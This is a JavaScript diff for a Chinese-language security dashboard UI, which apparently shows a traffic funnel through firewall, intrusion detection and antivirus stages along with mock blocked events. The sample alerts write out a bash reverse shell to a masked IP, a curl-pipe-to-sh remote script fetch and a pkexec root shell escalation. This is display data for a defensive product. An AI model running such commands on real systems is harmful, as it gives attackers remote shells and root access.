+      { id: 'ids', ic: 'ids', n: '入侵检测', h: '反弹 Shell、高危命令、提权、异常登录', b: sc(1206), verb: '拦截', c: '#f28a2e' },
+      { id: 'av', ic: 'av', n: '病毒查杀', h: '落盘查杀、挖矿、勒索、WebShell', b: sc(42), verb: '查杀', c: '#ee3e9e' },
+      { id: 'out', ic: 'out', n: '正常放行', h: '通过三层检查，到达业务', c: '#5fc88a' }];
+    let cur = IN; SG.forEach((g) => { g.into = cur; g.b = g.b || 0; g.passed = cur - g.b; cur = g.passed; });
+    const tb = SG.reduce((a, g) => a + g.b, 0);
+    const VW = [1, 0.85, 0.72, 0.6, 0.5]; SG.forEach((g, i) => { g.vi = VW[i]; g.vp = i < SG.length - 1 ? VW[i + 1] : VW[i]; });
+    const pct = (x) => { const p = Math.min(1, x) * 100; if (p >= 99.95) return '100%'; if (p > 0 && p < 0.05) return '<0.1%'; return p.toFixed(1).replace(/\.0$/, '') + '%'; };
     const EX = {
-      fw: [{ t: '45.xx.xx.12 → web-prod-01:22', m: 'SSH 暴力破解，1 分钟内尝试 312 次', rule: '暴力破解封禁 · 30 次/分钟', at: '09:12', act: '加入白名单', dl: '已加入白名单' },
-        { t: '185.xx.xx.77 → db-01:3306', m: '公网访问数据库端口', rule: '访问控制 · 3306 仅内网', at: '08:47', act: '加入白名单', dl: '已加入白名单' },
-        { t: '103.xx.xx.9 → web-prod-02:3389', m: 'RDP 爆破 86 次后封禁 24 小时', rule: '暴力破解封禁', at: '07:30', act: '解除封禁', dl: '已解除封禁' }],
-      ids: [{ t: 'bash -i >& /dev/tcp/185.xx.xx.77/9001', m: 'web-prod-02 · php-fpm 派生 Shell 外联', rule: '反弹 Shell', at: '10:05', act: '查看告警', dl: '' },
-        { t: 'curl -s http://x.x/x.sh | sh', m: 'cache-01 · 管道执行远程脚本', rule: '高危命令', at: '09:58', act: '查看告警', dl: '' },
-        { t: 'pkexec --user root /bin/sh', m: 'db-01 · 普通用户尝试提权', rule: '本地提权', at: '06:21', act: '查看告警', dl: '' }],
-      av: [{ t: '/tmp/.x/kworkerd', m: 'cache-01 · XMRig 挖矿程序，已隔离', rule: '挖矿程序', at: '05:20', act: '恢复文件', dl: '已恢复，并加入信任' },
-        { t: '/var/www/upload/a.php', m: 'web-prod-02 · WebShell，已隔离', rule: 'WebShell', at: '03:12', act: '恢复文件', dl: '已恢复，并加入信任' },
-        { t: '/data/app/*.locked', m: 'db-01 · 批量加密行为，已暂停进程', rule: '防勒索', at: '23:40', act: '查看告警', dl: '' }] };
-    const pick = st.gfS || 'fw'; const res = st.gfX || {};
-    const rows = BASE.map((s, i) => {
-      const isTot = s.id === 'out'; const b = s.b ? sc(s.b) : 0; const r0 = reach; if (s.b) reach -= b;
-      const o = { key: s.id + rgK, n: s.n, h: s.h, dot: 'background:' + s.col, c: 'gf-r' + (pick === s.id ? ' on' : ''), sel: pick === s.id ? 'true' : 'false', go: ev(() => set({ gfS: s.id })), band: !isTot, tot: isTot, bw: 'width:' + WD[i] + '%;animation-delay:' + (i * 90) + 'ms', ew: 'width:' + (b ? 9 : 0) + '%;background:' + s.col + ';opacity:.6', segs: [], bc: '' };
-      if (s.id === 'in') { o.big = fmt(r0 * R); o.small = '全部访问'; o.bc = 'z'; }
-      else if (isTot) { o.big = fmt(tb * R); o.small = '放行 ' + fmt(sc(BASE[0].v) - tb); const L = BASE.slice(1, 4).map((x) => Math.log10(sc(x.b) + 1)); const sum = L.reduce((a, x) => a + x, 0); o.segs = BASE.slice(1, 4).map((x, k) => ({ st: 'flex:' + (L[k] / sum).toFixed(3) + ' 1 0;background:' + x.col + ';opacity:.85' })); }
-      else { o.big = s.verb + ' ' + fmt(b * R); o.small = '放行 ' + fmt(r0 - b) + ' · ' + (b / r0 * 100 < 0.1 ? '<0.1' : (b / r0 * 100).toFixed(1)) + '%'; }
-      return o; });
-    const PARTS = { in: [['外部访问', 0.94], ['内网访问', 0.05], ['本机进程', 0.01]], out: [['网络防火墙', sc(38214) / tb], ['入侵检测', sc(1206) / tb], ['病毒查杀', sc(42) / tb]] };
-    const ps = BASE.find((s) => s.id === pick);
-    const gf = { rows, rg: ['1h', '24h', '7d'].map((k) => ({ n: { '1h': '1 小时', '24h': '24 小时', '7d': '7 天' }[k], c: k === rgK ? 'on' : '', ck: k === rgK ? 'true' : 'false', go: ev(() => { this._t0 = Date.now(); set({ gfR: k, roll: 0 }); const step = () => { const p = Math.min(1, (Date.now() - this._t0) / 700); this.setState({ roll: p }); if (p < 1) requestAnimationFrame(step); }; requestAnimationFrame(step); }) })),
-      pn: ps.n, pd: EX[pick] ? '拦下的样例' : '构成', ex: (EX[pick] || []).map((x, k) => { const id = pick + k; const done = !!res[id]; return Object.assign({}, x, { key: id + rgK, can: !done, done, go: ev(() => { if (x.dl) set({ gfX: Object.assign({}, res, { [id]: 1 }) }); }) }); }),
-      parts: (PARTS[pick] || []).map(([n, f]) => ({ n, w: 'width:' + Math.max(2, f * 100).toFixed(1) + '%', v: fmt((pick === 'in' ? sc(BASE[0].v) : tb) * f) })) };
+      fw: [{ t: 'SSH 登录 root@web-prod-01，来源 45.xx.xx.12，1 分钟 312 次', hit: '45.xx.xx.12', rule: '暴力破解封禁 · 30 次/分钟', at: '2 分钟前', act: '加入白名单', dl: '已加入白名单' },
+        { t: '公网访问 db-01:3306，来源 185.xx.xx.77', hit: '3306', rule: '访问控制 · 3306 仅内网', at: '25 分钟前', act: '放行一次', dl: '已放行一次' },
+        { t: 'RDP 登录 web-prod-02，来源 103.xx.xx.9，失败 86 次后封禁', hit: '103.xx.xx.9', rule: '暴力破解封禁 · 24 小时', at: '1 小时前', act: '解除封禁', dl: '已解除封禁' }],
+      ids: [{ t: 'bash -i >& /dev/tcp/185.xx.xx.77/9001 0>&1', hit: '/dev/tcp/185.xx.xx.77/9001', code: 1, rule: '反弹 Shell · web-prod-02', at: '4 分钟前', act: '查看告警' },
+        { t: 'curl -s http://x.x/x.sh | sh', hit: '| sh', code: 1, rule: '高危命令 · cache-01', at: '11 分钟前', act: '查看告警' },
+        { t: 'pkexec --user root /bin/sh', hit: '--user root', code: 1, rule: '本地提权 · db-01', at: '3 小时前', act: '查看告警' }],
+      av: [{ t: '/tmp/.x/kworkerd  XMRig 挖矿程序，已隔离', hit: 'kworkerd', code: 1, rule: '挖矿程序 · cache-01', at: '5 小时前', act: '恢复文件', dl: '已恢复并信任' },
+        { t: '/var/www/upload/a.php  WebShell，已隔离', hit: 'a.php', code: 1, rule: 'WebShell · web-prod-02', at: '7 小时前', act: '恢复文件', dl: '已恢复并信任' },
+        { t: '/data/app/*.locked  批量加密，已暂停进程', hit: '*.locked', code: 1, rule: '防勒索 · db-01', at: '10 小时前', act: '查看告警' }] };
+    const PT = { in: [['外部访问', '公网 IP', 0.94], ['内网访问', '10.0.0.0/8', 0.05], ['本机进程', '进程与文件事件', 0.01]],
+      out: [['Web 服务', '80 / 443', 0.81], ['运维登录', 'SSH / RDP，均已通过 MFA', 0.04], ['其他', '数据库、缓存等内网访问', 0.15]] };
+    const pick = st.gfS || 'fw'; const res = st.gfX || {}; const pg = SG.find((g) => g.id === pick);
+    const tps = SG.slice(0, -1).map((g, i) => { const a = g.vp * 500, b = SG[i + 1].vi * 500; const t = i * 40 + 28, u = (i + 1) * 40 + 12, m = (t + u) / 2; return { d: 'M' + (500 - a) + ' ' + t + 'C' + (500 - a) + ' ' + m + ' ' + (500 - b) + ' ' + m + ' ' + (500 - b) + ' ' + u + 'H' + (500 + b) + 'C' + (500 + b) + ' ' + m + ' ' + (500 + a) + ' ' + m + ' ' + (500 + a) + ' ' + t + 'Z' }; });
+    const gf = { k: rgK, tot: fmt(tb * R), tps,
+      rows: SG.map((g, i) => ({ c: 'gf2-row' + (pick === g.id ? ' on' : ''), sel: pick === g.id ? 'true' : 'false', go: ev(() => set({ gfS: g.id })), ic: 'gf2-ic i-' + g.ic, icc: 'color:' + g.c, n: g.n,
+        mt: g.b ? fmt(g.b * R) + ' ' + g.verb : i === 0 ? '进入' : i === SG.length - 1 ? '到达业务' : '0 ' + g.verb, cnt: fmt(g.passed * R), pct: pct(g.passed / IN),
+        al: g.n + '：放行 ' + fmt(g.passed) + (g.b ? '，' + g.verb + ' ' + fmt(g.b) : '') + '，占全部 ' + pct(g.passed / IN) })),
+      bands: SG.map((g, i) => { const last = i === SG.length - 1; return { st: '--c:' + g.c + ';top:' + (i * 40 + 12) + 'px;width:' + (g.vi * 100).toFixed(2) + '%;animation-delay:' + (i * 70) + 'ms', hasEnd: g.b > 0, cc: 'gf2-core' + (last ? ' last' : ''), cw: 'width:' + (g.vp / g.vi * 100).toFixed(2) + '%', sd: 'animation-delay:' + (i * 180 + 800) + 'ms' }; }),
+      rg: [['1h', '1 小时'], ['24h', '24 小时'], ['7d', '7 天']].map(([k, n]) => ({ n, c: k === rgK ? 'on' : '', ck: k === rgK ? 'true' : 'false', go: ev(() => { this._t0 = Date.now(); set({ gfR: k, roll: 0 }); const step = () => { const p = Math.min(1, (Date.now() - this._t0) / 600); this.setState({ roll: p }); if (p < 1) requestAnimationFrame(step); }; requestAnimationFrame(step); }) })),
+      pn: pg.n, ph: pg.h, pc: '--c:' + pg.c,
+      ex: (EX[pick] || []).map((x, k) => { const id = pick + k; const done = !!res[id]; const at = x.t.indexOf(x.hit); return { key: id, tc: 'gf2-et' + (x.code ? ' code' : ''), lead: x.t.slice(0, at), hit: x.hit, tail: x.t.slice(at + x.hit.length), rule: x.rule, at: x.at, act: x.act, can: !done, done, dl: x.dl, go: ev(() => { if (x.dl) set({ gfX: Object.assign({}, res, { [id]: 1 }) }); }) }; }),
+      parts: (PT[pick] || []).map(([n, note, f], k) => ({ key: pick + k, n, note, v: fmt(pg.passed * f * R), p: pct(f), w: 'width:' + (f * 100).toFixed(1) + '%' })) };
 
     /* 5 你不在时 */
     const S0 = 22 * 60, SPAN = 630; const tm = (h) => { let [a, b] = h.split(':').map(Number); let m = a * 60 + b; if (m < S0) m += 1440; return m - S0; };
